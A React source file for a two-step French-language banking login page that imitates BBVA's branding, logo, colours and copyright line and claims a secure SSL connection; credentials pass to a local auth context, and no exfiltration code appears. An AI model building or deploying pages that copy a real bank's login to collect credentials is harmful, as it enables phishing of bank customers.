// pages/LoginPage.jsx
import React, { useState, useEffect } from "react";
import { useAuth } from "../context/AuthContext";
import { Eye, EyeOff, Lock, Check, ArrowRight, ChevronLeft } from "lucide-react";

export default function LoginPage({ navigate }) {
  const { login } = useAuth();
  const [step, setStep] = useState("code");
  const [code, setCode] = useState("");
  const [password, setPassword] = useState("");
  const [showPassword, setShowPassword] = useState(false);
  const [error, setError] = useState("");
  const [loading, setLoading] = useState(false);
  const [animate, setAnimate] = useState(false);
  const [shake, setShake] = useState(false);

  useEffect(() => {
    setTimeout(() => setAnimate(true), 50);
  }, []);

  const goToPassword = () => {
    setAnimate(false);
    setTimeout(() => { setStep("password"); setAnimate(true); }, 250);
  };

  const goBackToCode = () => {
    setAnimate(false);
    setTimeout(() => { setStep("code"); setError(""); setPassword(""); setAnimate(true); }, 250);
  };

  const triggerShake = () => {
    setShake(true);
    setTimeout(() => setShake(false), 500);
  };

  const handleCodeSubmit = (e) => {
    e.preventDefault();
    setError("");
    if (code.length < 6) { setError("Le code client doit contenir au moins 6 chiffres"); triggerShake(); return; }
    setLoading(true);
    setTimeout(() => { setLoading(false); goToPassword(); }, 700);
  };

  const handlePasswordSubmit = (e) => {
    e.preventDefault();
    setError("");
    if (password.length < 4) { setError("Le code secret doit contenir au moins 4 chiffres"); triggerShake(); return; }
    setLoading(true);
    setTimeout(() => {
      const result = login(code, password);
      setLoading(false);
      if (result.success) { navigate("dashboard"); }
      else { setError(result.message || "Identifiants incorrects"); triggerShake(); }
    }, 900);
  };

  return (
    <div translate="no" className="min-h-screen flex flex-col" style={{ backgroundColor: "#f5f7fa" }}>

      {/* Header BBVA */}
      <div className="bg-white shadow-sm px-6 py-4 flex items-center justify-center">
        <img src="images/L1.jpeg" alt="BBVA" className="h-10 w-auto object-contain" />
      </div>

      {/* Card centrale */}
      <div className="flex-1 flex items-center justify-center px-4 py-10">
        <div
          className="bg-white rounded-2xl shadow-lg w-full max-w-sm overflow-hidden"
          style={{
            opacity: animate ? 1 : 0,
            transform: animate ? "translateY(0)" : "translateY(20px)",
            transition: "opacity 0.35s ease, transform 0.35s ease",
          }}
        >
          <div className="h-1.5 w-full" style={{ backgroundColor: "#004481" }} />

          <div className="px-8 py-8" style={{ animation: shake ? "shake 0.4s ease" : "none" }}>

            {/* Étape indicator */}
            <div className="flex items-center gap-2 mb-6">
              <div className="w-2 h-2 rounded-full" style={{ backgroundColor: "#004481" }} />
              <div className="w-2 h-2 rounded-full transition-all duration-300"
                style={{ backgroundColor: step === "password" ? "#004481" : "#d1d5db" }} />
            </div>

            {/* Titre */}
            <h1 className="text-xl font-bold text-gray-900 mb-1">
              {step === "code" ? "Bienvenue" : "Code secret"}
            </h1>
            <p className="text-gray-400 text-sm mb-7">
              {step === "code"
                ? "Connectez-vous à votre espace personnel"
                : <span>{"Code client ····" + code.slice(-2)}</span>
              }
            </p>

            {/* ÉTAPE 1 : Code client */}
            {step === "code" && (
              <div className="space-y-5">
                <div>
                  <label className="block text-xs font-semibold text-gray-500 uppercase tracking-wider mb-2">
                    <span>Code client</span>
                  </label>
                  <div className="relative">
                    <input
                      type="text"
                      value={code}
                      onChange={(e) => { setCode(e.target.value.replace(/\D/g, "")); setError(""); }}
                      className="w-full border-0 border-b-2 py-3 text-xl tracking-[0.3em] bg-transparent focus:outline-none transition-colors duration-200"
                      style={{ borderBottomColor: error ? "#ef4444" : code.length >= 6 ? "#004481" : "#e5e7eb" }}
                      onFocus={e => !error && (e.target.style.borderBottomColor = "#004481")}
                      onBlur={e => code.length < 6 && !error && (e.target.style.borderBottomColor = "#e5e7eb")}
                      placeholder="••••••••"
                      maxLength="10"
                      autoFocus
                    />
                    {code.length >= 6 && (
                      <div className="absolute right-0 top-1/2 -translate-y-1/2 w-6 h-6 rounded-full flex items-center justify-center"
                        style={{ backgroundColor: "#004481" }}>
                        <Check size={14} color="white" />
                      </div>
                    )}
                  </div>
                  {error && (
                    <p className="text-red-500 text-xs mt-2 flex items-center gap-1">
                      <span>{"⚠ " + error}</span>
                    </p>
                  )}
                </div>

                <button
                  onClick={handleCodeSubmit}
                  disabled={loading || code.length < 6}
                  className="w-full text-white font-semibold py-3.5 rounded-xl flex items-center justify-center gap-2 transition-all duration-200 disabled:opacity-40 hover:brightness-110 active:scale-95"
                  style={{ backgroundColor: "#004481" }}
                >
                  {loading ? (
                    <span className="flex items-center gap-2">
                      <svg className="animate-spin h-4 w-4" viewBox="0 0 24 24" fill="none">
                        <circle className="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" strokeWidth="4"/>
                        <path className="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8v8z"/>
                      </svg>
                      <span>{"Vérification..."}</span>
                    </span>
                  ) : (
                    <span className="flex items-center gap-2">{"Continuer"} <ArrowRight size={16} /></span>
                  )}
                </button>
              </div>
            )}

            {/* ÉTAPE 2 : Mot de passe */}
            {step === "password" && (
              <div className="space-y-5">
                <div>
                  <label className="block text-xs font-semibold text-gray-500 uppercase tracking-wider mb-2">
                    <span>Code secret</span>
                  </label>
                  <div className="relative">
                    <input
                      type={showPassword ? "text" : "password"}
                      value={password}
                      onChange={(e) => { setPassword(e.target.value); setError(""); }}
                      className="w-full border-0 border-b-2 py-3 pr-10 text-xl tracking-[0.3em] bg-transparent focus:outline-none transition-colors duration-200"
                      style={{ borderBottomColor: error ? "#ef4444" : "#e5e7eb" }}
                      onFocus={e => !error && (e.target.style.borderBottomColor = "#004481")}
                      onBlur={e => !error && (e.target.style.borderBottomColor = "#e5e7eb")}
                      placeholder="••••••"
                      maxLength="6"
                      autoFocus
                    />
                    <button
                      type="button"
                      onClick={() => setShowPassword(!showPassword)}
                      className="absolute right-0 top-1/2 -translate-y-1/2 text-gray-400 hover:text-gray-600 transition-colors"
                    >
                      {showPassword ? <EyeOff size={20} /> : <Eye size={20} />}
                    </button>
                  </div>
                  {error && (
                    <p className="text-red-500 text-xs mt-2">
                      <span>{"⚠ " + error}</span>
                    </p>
                  )}
                </div>

                <div className="flex gap-3">
                  <button
                    type="button"
                    onClick={goBackToCode}
                    className="flex items-center justify-center px-4 py-3 border border-gray-200 text-gray-600 font-medium rounded-xl hover:bg-gray-50 transition-all active:scale-95"
                  >
                    <ChevronLeft size={18} />
                  </button>
                  <button
                    onClick={handlePasswordSubmit}
                    disabled={loading || password.length < 4}
                    className="flex-1 text-white font-semibold py-3 rounded-xl flex items-center justify-center gap-2 transition-all duration-200 disabled:opacity-40 hover:brightness-110 active:scale-95"
                    style={{ backgroundColor: "#004481" }}
                  >
                    {loading ? (
                      <span className="flex items-center gap-2">
                        <svg className="animate-spin h-4 w-4" viewBox="0 0 24 24" fill="none">
                          <circle className="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" strokeWidth="4"/>
                          <path className="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8v8z"/>
                        </svg>
                        <span>{"Connexion..."}</span>
                      </span>
                    ) : (
                      <span className="flex items-center gap-2">{"Se connecter"} <ArrowRight size={16} /></span>
                    )}
                  </button>
                </div>
              </div>
            )}

            {/* Sécurité */}
            <div className="mt-7 flex items-center justify-center gap-2 text-gray-300 text-xs">
              <Lock size={12} />
              <span>{"Connexion sécurisée SSL 256 bits"}</span>
            </div>
          </div>
        </div>
      </div>

      {/* Footer */}
      <div className="text-center py-4 text-xs text-gray-400">
        <span>{"© 2025 BBVA S.A. – Tous droits réservés"}</span>
      </div>

      <style>{`
        @keyframes shake {
          0%, 100% { transform: translateX(0); }
          20% { transform: translateX(-6px); }
          40% { transform: translateX(6px); }
          60% { transform: translateX(-4px); }
          80% { transform: translateX(4px); }
        }
      `}</style>
    </div>
  );
}